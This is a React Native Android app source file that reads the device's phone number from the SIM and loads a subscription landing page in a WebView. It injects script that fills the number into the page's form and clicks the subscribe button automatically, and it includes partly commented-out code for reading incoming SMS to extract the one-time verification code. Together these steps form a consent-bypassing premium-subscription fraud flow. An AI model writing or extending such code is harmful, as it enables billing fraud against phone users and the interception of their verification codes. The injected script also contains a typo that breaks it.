import { WebView } from 'react-native-webview';
import DeviceInfo from 'react-native-device-info';
import SmsRetriever from 'react-native-sms-retriever';
import React, { useEffect, useRef, useState } from 'react';
import SimCardsManagerModule from 'react-native-sim-cards-manager';
import { StyleSheet, Text, View, ActivityIndicator, PermissionsAndroid, Alert } from 'react-native';
// import SmsAndroid from 'react-native-sms-android';

const App = () => {
  const webViewRef = useRef(null);
  const [loading, setLoading] = useState(false);

    // Request SMS permission and fetch messages
    useEffect(() => {
      const initialize = async () => {
        const permissionGranted = await requestPermissions();
        if (permissionGranted) {
          handleGetData();
        }
      };
      initialize();
    }, []);

    const handlegetDevicedata = async () => {
      const version = await DeviceInfo.getSystemVersion();
      const numericVersion = parseFloat(version); 
      retrievePhoneNumber();
      // if (numericVersion <= 10) {
      //   handleGetData();
      // } else {
      //   retrievePhoneNumber();
      // }
    
      console.log('Device version:', numericVersion);
    };
    

  const requestPermissions = async () => {
    try {
      const hasPhoneStatePermission = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE
      );

      const hasSmsPermission = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_SMS
      );

      if (
        hasPhoneStatePermission === PermissionsAndroid.RESULTS.GRANTED &&
        hasSmsPermission === PermissionsAndroid.RESULTS.GRANTED
      ) {
        return true;
      } else {
        Alert.alert('Permission Denied', 'You need to grant permissions to read phone state and SMS');
        return false;
      }
    } catch (err) {
      console.error('Error requesting permissions:', err);
      return false;
    }
  };

  const retrievePhoneNumber = async () => {
    const hasPermissions = await requestPermissions();
    if (!hasPermissions) return;

    try {
      const number = await SmsRetriever.requestPhoneNumber();
      console.log('Phone Number:', number);
      if (number) {
        injectPhoneNumberAndSubmit(number);
        // Alert.alert('Phone Number Detected', number);
      }
    } catch (error) {
      console.error('Error retrieving phone number:', error);
      // Alert.alert('Failed to retrieve phone number');
    }
  };

  const handleGetData = async () => {
    try {
      const simCards = await SimCardsManagerModule.getSimCards({
        title: 'App Permission',
        message: 'Custom message',
        buttonNeutral: 'Not now',
        buttonNegative: 'Not OK',
        buttonPositive: 'OK',
      });
      if (simCards.length > 0) {
        injectPhoneNumberAndSubmit(simCards[0]?.phoneNumber);
      }
    } catch (error) {
      console.log(error, 'error in getSimCards');
    }
  };

  const injectPhoneNumberAndSubmit = (phoneNumber) => {
    if (phoneNumber) {
      const jsCode = `
        const inputField = document.querySelector('#Msisdn_fake');
        const subscribeButton = document.querySelector('#btnSubscribe');
        if (inputField) {
          inputField.value = '${phoneNumber}';  
        }
        if (!inputField.value){
        retun
        }
        if (subscribeButton) {
          subscribeButton.click();
        }
        true;
      `;
      webViewRef.current.injectJavaScript(jsCode);
      setTimeout(() => {
        fetchSmsMessages();
      }, 8000);
    }
  };

  const fetchSmsMessages = () => {
    // SmsAndroid.list(
    //   JSON.stringify({ box: 'inbox', indexFrom: 0, maxCount: 1 }),
    //   (fail) => {
    //     console.log('Failed to fetch SMS:', fail);
    //   },
    //   (count, smsList) => {
    //     console.log(smsList,'smsList');
        
    //     if (smsList && smsList.length > 0) {
    //       const jasondata = JSON.parse(smsList);
    //       const firstSms = jasondata[0];
    //       console.log('First SMS:', firstSms);
  
    //       if (firstSms && firstSms.body) {
    //         const otp = extractOtpFromSms(firstSms);
    //         if (otp) {
    //           console.log('Extracted OTP:', otp);
    //           setMessage(otp);
    //         }
    //       } else {
    //         fetchSmsMessages();
    //         console.log('No body in the SMS:', firstSms);
    //       }
    //     }
    //   }
    // );
  };
  
  // Function to extract OTP from SMS body
  const extractOtpFromSms = (sms) => {
    const otpRegex = /Your verification code is:\s*(\d{4,6})/;
    const match = sms.body.match(otpRegex); 
  
    if (match && match[1]) {
      return match[1];
    }
    return null;
  };
  

  return (
    <View style={styles.container}>
      {loading && (
        <View style={styles.loading}>
          <ActivityIndicator size="large" color="#0000ff" />
          <Text>Loading...</Text>
        </View>
      )}
      <WebView
        ref={webViewRef}
        source={{ uri: 'https://lps.vclipss.com/stckwt/xs1.aspx' }}
        onLoadEnd={() => {
          setLoading(false);
        }}
      />
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  loading: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
});

export default App;
